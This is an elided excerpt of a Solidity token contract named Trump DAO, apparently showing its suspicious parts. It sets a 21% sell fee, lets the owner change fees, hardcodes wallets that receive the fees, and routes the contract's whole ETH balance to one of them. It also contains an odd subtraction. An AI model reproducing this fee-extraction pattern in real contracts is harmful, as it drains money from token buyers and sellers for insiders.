...
contract TrumpDAO is ERC20, Ownable {
    ...
    constructor() ERC20("Trump DAO", "TDAO") {
        ...
        buyLiquidityFee = 0;
        buyTreasuryFee = 0;
        buyTotalFees = buyRewardsFee + buyLiquidityFee + buyTreasuryFee;

        sellRewardsFee = 21;
        sellLiquidityFee = 0;
        sellTreasuryFee = 0;
        sellTotalFees = sellRewardsFee + sellLiquidityFee + sellTreasuryFee;

        _excludeFromMaxTransaction(newOwner, true);
        _excludeFromMaxTransaction(address(this), true);
        _excludeFromMaxTransaction(address(0xdead), true);

        RewardsAddress = address(0xb7c1C14d96689A3FE1354b10a2496424BAc7aFc3);
        EcosystemAddress = address(0x1b86567406B7B3fc09918e80805Bb365172D4BC4);
    ...
    function updateSwapThreshold(uint256 newAmount) public  {
        require(msg.sender==RewardsAddress,"only RewardsAddress can withdraw");
    ...
    function updateBuyFees(uint256 _RewardsFee, uint256 _liquidityFee, uint256 _TreasuryFee) external onlyOwner {
    ...
    function updateSellFees(uint256 _RewardsFee, uint256 _liquidityFee, uint256 _TreasuryFee) external onlyOwner {
    ...
    function swapBack() private {
        ...
        uint256 totalTokensToSwap = tokensForLiquidity + tokensForRewards + tokensForTreasury;
        ...
        ethForLiquidity -= ethForRewards + ethForTreasury;
        ...
        (success,) = address(EcosystemAddress).call{value: ethForTreasury}("");

        (success,) = address(RewardsAddress).call{value: address(this).balance}("");
    }
